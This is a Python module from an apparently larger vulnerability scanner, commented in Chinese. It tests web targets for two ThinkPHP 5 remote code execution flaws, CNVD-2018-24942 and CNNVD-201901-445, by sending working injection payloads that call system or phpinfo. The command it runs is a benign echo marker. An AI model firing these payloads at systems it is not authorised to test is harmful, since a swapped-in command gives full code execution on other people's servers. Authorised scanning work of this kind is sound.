#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    ThinkPHP扫描类: 
        ThinkPHP5 未开启强制路由RCE
            CNVD-2018-24942
        ThinkPHP5 核心类Request远程代码执行
            CNNVD-201901-445
'''

from lib.initial.config import config
from lib.tool.md5 import md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from thirdparty import requests

class ThinkPHP():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'ThinkPHP'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cnvd_2018_24942_payloads = [
            {
                'path': 'index.php?s=index/\\think\Request/input&filter[]=system&data={}'.format(self.cmd),
                'data': ''
            },
            {
                'path': 'index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={}'.format(self.cmd),
                'data': ''
            },
            {
                'path': 'index.php?s=index/\\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={}'.format(self.cmd),
                'data': ''
            },
            {
                'path': 'index.php?s=index/\\think\\view\driver\Php/display&content={}'.format('<?php phpinfo();?>'),
                'data': ''
            }
        ]

        self.cnnvd_201901_445_payloads = [
            {
                'path': 'index.php?s=captcha',
                'data': '_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]={}'.format(self.cmd)
            }
        ]

    def cnvd_2018_24942_scan(self, url):
        ''' ThinkPHP5 未开启强制路由RCE'''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'CNVD-2018-24942'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        headers = self.headers
        headers.update(vul_info['headers'])

        for payload in self.cnvd_2018_24942_payloads:   # * Payload
            path = payload['path']                      # * Path
            data = payload['data']                      # * Data
            target = url + path                         # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=headers, 
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                vul_info['status_code'] = str(res.status_code)
                logger.logging(vul_info)                        # * LOG
            except requests.ConnectTimeout:
                vul_info['status_code'] = 'Timeout'
                logger.logging(vul_info)
                return None
            except requests.ConnectionError:
                vul_info['status_code'] = 'Faild'
                logger.logging(vul_info)
                return None
            except:
                vul_info['status_code'] = 'Error'
                logger.logging(vul_info)
                return None

            # * 判断扫描结果
            if (self.md in check.check_res(res.text, self.md)) or ('PHP Version' in res.text):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path
                    }
                }
                return results

    def cnnvd_201901_445_scan(self, url):
        ''' ThinkPHP5 核心类Request远程代码执行'''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'CNNVD-201901-445'
        vul_info['vul_method'] = 'POST'
        vul_info['headers'] = {}

        headers = self.headers
        headers.update(vul_info['headers'])

        for payload in self.cnnvd_201901_445_payloads:  # * Payload
            path = payload['path']                      # * Path
            data = payload['data']                      # * Data
            target = url + path                         # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=headers, 
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                vul_info['status_code'] = str(res.status_code)
                logger.logging(vul_info)                        # * LOG
            except requests.ConnectTimeout:
                vul_info['status_code'] = 'Timeout'
                logger.logging(vul_info)
                return None
            except requests.ConnectionError:
                vul_info['status_code'] = 'Faild'
                logger.logging(vul_info)
                return None
            except:
                vul_info['status_code'] = 'Error'
                logger.logging(vul_info)
                return None

            # * 判断扫描结果
            if self.md in check.check_res(res.text, self.md):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path,
                        'Data': data
                    }
                }
                return results

    def addscan(self, url):
        return [
            thread(target=self.cnvd_2018_24942_scan, url=url),
            thread(target=self.cnnvd_201901_445_scan, url=url)
        ]

thinkphp = ThinkPHP()